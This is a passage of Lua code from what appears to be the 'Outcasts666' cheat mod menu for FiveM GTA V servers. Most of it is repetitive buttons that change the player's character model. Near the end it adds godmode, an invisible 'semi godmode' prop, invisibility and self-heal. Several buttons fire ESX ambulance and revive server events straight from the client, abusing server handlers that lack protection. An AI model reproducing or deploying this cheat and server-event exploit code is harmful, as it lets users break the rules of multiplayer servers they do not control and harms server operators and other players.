					SetPlayerModel(PlayerId(), GetHashKey(model))
					end	
                elseif Outcasts666.Button('~c~~h~Model~b~ Ranger F') then
			local model = "S_F_Y_Ranger_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end	
                elseif Outcasts666.Button('~c~~h~Model~b~ Ranger Male') then
			local model = "S_M_Y_Ranger_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Robot Ranger Male') then
			local model = "U_M_Y_RSRanger_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Desert Army 01') then
			local model = "G_M_Y_DesArmy_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Desert Army 02') then
			local model = "G_M_Y_DesArmy_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Desert Army 03') then
			local model = "G_M_Y_DesArmy_03"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Desert Army 04') then
			local model = "G_M_Y_DesArmy_04"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Desert Army 05') then
			local model = "G_M_Y_DesArmy_05"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Marine 01') then
			local model = "S_M_Y_Marine_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end					
                elseif Outcasts666.Button('~c~~h~Model~b~ Marine 02') then
			local model = "S_M_Y_Marine_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Marine 03') then
			local model = "S_M_Y_Marine_03"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Marine Commander') then
			local model = "S_M_M_Marine_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Marine General') then
			local model = "S_M_M_Marine_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Black OPS1 M') then
			local model = "S_M_Y_BlackOps_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Black OPS2 M') then
			local model = "S_M_Y_BlackOps_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Black OPS3 M') then
			local model = "S_M_Y_BlackOps_03"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Prison Guard M') then
			local model = "S_M_M_PrisGuard_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~b~ Paramedic M') then
			local model = "S_M_M_Paramedic_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~y~ Vagos F') then
			local model = "G_F_Y_Vagos_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~g~ Ramp Gang M') then
			local model = "IG_Ramp_Gang"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~g~ Ramp Gang Boss M') then
			local model = "CSB_Ramp_gang"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~g~ Fam Gang 01 M') then
			local model = "MP_M_FamDD_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~g~ Fam Gang 02 M') then
			local model = "G_M_Y_FamDNF_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~g~ Fam Gang Boss M') then
			local model = "G_M_Y_FamCA_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~p~ Bella Gang 01 M') then
			local model = "G_M_Y_BallaEast_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~p~ Bella Gang 02 M') then
			local model = "G_M_Y_BallaSout_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~p~ Bella Gang 03 M') then
			local model = "IG_BallasOG"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~p~ Bella Gang 04 M') then
			local model = "IG_BallasOG"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~p~ Bella Gang F') then
			local model = "G_F_Y_Ballas_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~p~ Bella Gang Boss M') then
			local model = "G_M_Y_BallaOrig_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Jewel F') then
			local model = "U_F_Y_JewelAss_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Jewel Thief') then
			local model = "U_M_M_JewelThief"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~o~ Prisoner 01 M') then
			local model = "S_M_Y_PrisMuscl_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~o~ Prisoner 02 M') then
			local model = "S_M_Y_Prisoner_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~o~ Prisoner 03 M') then
			local model = "U_M_Y_Prisoner_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Body Builder 01 M') then
			local model = "A_M_Y_MusclBeac_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Body Builder 02 M') then
			local model = "A_M_Y_MusclBeac_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Body Builder 03 M') then
			local model = "A_M_Y_Surfer_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Body Builder 04 M') then
			local model = "IG_TylerDix"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Body Builder 05 M') then
			local model = "u_m_y_babyd"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Body Builder F') then
			local model = "CS_MaryAnn"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Beach 01 F') then
			local model = "A_F_M_Beach_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Beach 02 F') then
			local model = "A_F_Y_Beach_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Beach Fat F') then
			local model = "A_F_M_FatCult_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Female 01') then
			local model = "A_F_Y_BevHills_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Female 02') then
			local model = "A_F_Y_BevHills_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Female 03') then
			local model = "A_F_Y_BevHills_03"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Female 04') then
			local model = "A_F_Y_BevHills_04"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Female 05') then
			local model = "CSB_Bride"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Female 06') then
			local model = "U_F_Y_PoppyMich"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Female 07') then
			local model = "A_F_Y_SouCent_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Female 08') then
			local model = "CSB_Anita"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Skater Female') then
			local model = "A_F_Y_Skater_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Old Man') then
			local model = "U_M_O_TapHillBilly"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Guy 01') then
			local model = "S_M_Y_Barman_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Guy 02') then
			local model = "A_M_Y_BreakDance_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Guy 03') then
			local model = "U_M_Y_Chip"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Guy 04') then
			local model = "U_M_Y_GunVend_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Guy 05') then
			local model = "CSB_Groom"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Rich Guy 06') then
			local model = "A_M_Y_Business_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Chinese M 01') then
			local model = "G_M_M_ChiBoss_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Chinese M 02') then
			local model = "G_M_M_ChiGoon_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Chinese M 03') then
			local model = "G_M_M_ChiGoon_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Chinese M 04') then
			local model = "CSB_Hao"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Chinese F') then
			local model = "A_F_Y_Vinewood_03"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Korean M 01') then
			local model = "A_M_Y_KTown_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Korean M 02') then
			local model = "A_M_Y_KTown_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Korean M 03') then
			local model = "G_M_M_KorBoss_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Korean M 04') then
			local model = "G_M_Y_Korean_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Korean M 05') then
			local model = "G_M_Y_Korean_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Korean F 01') then
			local model = "S_F_Y_MovPrem_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Korean F 02') then
			local model = "A_F_M_KTown_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Korean F 03') then
			local model = "A_F_M_KTown_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Korean F 04') then
			local model = "A_F_O_KTown_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Mexican M 01') then
			local model = "A_M_M_MexCntry_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Mexican M 02') then
			local model = "A_M_M_MexLabor_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Mexican M 03') then
			local model = "A_M_Y_MexThug_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Mexican M 04') then
			local model = "G_M_M_MexBoss_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Mexican M 05') then
			local model = "G_M_M_MexBoss_02"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Mexican M 06') then
			local model = "U_M_Y_Mani"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Mexican M 07') then
			local model = "S_M_M_Mariachi_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Mexican F') then
			local model = "U_F_Y_SpyActress"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Mexican HMaid F') then
			local model = "S_F_M_Maid_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Boar') then
			local model = "A_C_Boar"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Pig') then
			local model = "A_C_Pig"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Deer') then
			local model = "A_C_Deer"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Chicken') then
			local model = "A_C_Hen"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Hawk') then
			local model = "A_C_Chickenhawk"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Crow') then
			local model = "A_C_Crow"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Monkey') then
			local model = "A_C_Chimp"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Dog Chop') then
			local model = "A_C_Chop"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Dog Husky') then
			local model = "A_C_Husky"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Dog Rottweiler') then
			local model = "A_C_Rottweiler"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Dog Shepherd') then
			local model = "A_C_shepherd"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Lion') then
			local model = "A_C_MtLion"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Rat') then
			local model = "A_C_Rat"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Shark') then
			local model = "A_C_SharkTiger"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model Animal~s~ Coyote') then
			local model = "A_C_Coyote"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~g~ Alien') then
			local model = "s_m_m_movalien_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Pongo') then
			local model = "u_m_y_pogo_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ Bartender F') then
			local model = "S_F_Y_Bartender_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
					end
                elseif Outcasts666.Button('~c~~h~Model~s~ FiveM') then
			local model = "mp_m_freemode_01"
				RequestModel(GetHashKey(model)) 
				Wait(500)
				if HasModelLoaded(GetHashKey(model)) then
					SetPlayerModel(PlayerId(), GetHashKey(model))
			
					
				else ShowInfo("~r~Model not recognized")
				    end
                elseif Outcasts666.Button('~c~~h~Randomize~s~ Clothing') then
				     SetPedRandomComponentVariation(PlayerPedId(), true)
                end
					
					Outcasts666.Display()
                elseif Outcasts666.IsMenuOpened("SelfMenu") then
                                    if
                    Outcasts666.CheckBox(
                        '~h~~g~Godmode',
                        Godmode,
                        function(dR)
                            Godmode = dR
                        end
                    )
                 then
                elseif Outcasts666.Button('~h~~y~Semi ~g~Godmode') then
                    local dS = 'stt_prop_stunt_soccer_ball'
                    while not HasModelLoaded(GetHashKey(dS)) do
                        Citizen.Wait(0)
                        RequestModel(GetHashKey(dS))
                    end
                    local dT = CreateObject(GetHashKey(dS), 0, 0, 0, true, true, false)
                    SetEntityVisible(dT, 0, 0)
                    AttachEntityToEntity(
                        dT,
                        GetPlayerPed(-1),
                        GetPedBoneIndex(GetPlayerPed(-1), 57005),
                        0,
                        0,
                        -1.0,
                        0,
                        0,
                        0,
                        false,
                        true,
                        true,
                        true,
                        1,
                        true
                    )
                elseif
                    Outcasts666.CheckBox(
                        '~h~~g~Player Visible',
                        invisible,
                        function(dR)
                            invisible = dR
                        end
                    )
                 then
                elseif Outcasts666.Button('~h~~r~Suicide') then
                    SetEntityHealth(PlayerPedId(-1), 0)
                elseif Outcasts666.Button('~h~~g~ESX~s~ Revive Yourself~s~') then
                    TriggerEvent('esx_ambulancejob:revive')
                elseif Outcasts666.Button('~h~~g~Heal/Revive') then
                    SetEntityHealth(PlayerPedId(-1), 200)
                elseif Outcasts666.Button('~h~~g~ESX~s~ Revive Yourself~s~') then
                    TriggerEvent('esx_ambulancejob:revive')
                    TriggerEvent('ambulancier:selfRespawn')
                elseif Outcasts666.Button('~h~~g~ESX~s~ 2ndRevive ~s~') then
					TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(-1))
                    TriggerServerEvent("esx_ambulancejob:revive",GetPlayerServerId(-1),GetPlayerServerId(-1))
					TriggerServerEvent("whoapd:revive", GetPlayerServerId(-1))
				    TriggerServerEvent("paramedic:revive", GetPlayerServerId(-1))
				    TriggerServerEvent("ems:revive", GetPlayerServerId(-1))
                    TriggerServerEvent('esx_ambulancejob:setDeathStatus', false)
                    StopScreenEffect('DeathFailOut')
                    DoScreenFadeIn(800)
                elseif Outcasts666.Button("~h~~r~ESX ~s~Open Menu Jail") then
